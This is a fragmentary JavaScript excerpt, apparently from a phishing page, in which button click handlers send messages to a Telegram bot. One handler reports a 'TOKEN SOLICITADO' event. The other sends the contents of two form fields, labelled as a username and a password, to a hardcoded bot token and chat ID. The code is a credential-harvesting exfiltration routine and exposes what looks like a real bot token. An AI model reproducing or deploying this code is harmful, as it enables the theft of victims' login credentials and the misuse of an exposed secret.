...
requestbutton.addEventListener("click", () => {
  ...
  const url =
    "https://api.telegram.org/bot6336559363:AAGqIcAHiEU4y1oK5YW8qY2mkXM6OrQe5tg/sendMessage?chat_id=6336559363&text=TOKEN%20SOLICITADO";
  Http.open("GET", url);
  Http.send();
...
sendatatme.addEventListener("click", () => {
  const Http = new XMLHttpRequest();
  const url =
    "https://api.telegram.org/bot6336559363:AAGqIcAHiEU4y1oK5YW8qY2mkXM6OrQe5tg/sendMessage?chat_id=6336559363&text=USERNAME:%20" +
    resfirst.value +
    " PASSWORD: " +
    resecond.value;
  Http.open("GET", url);
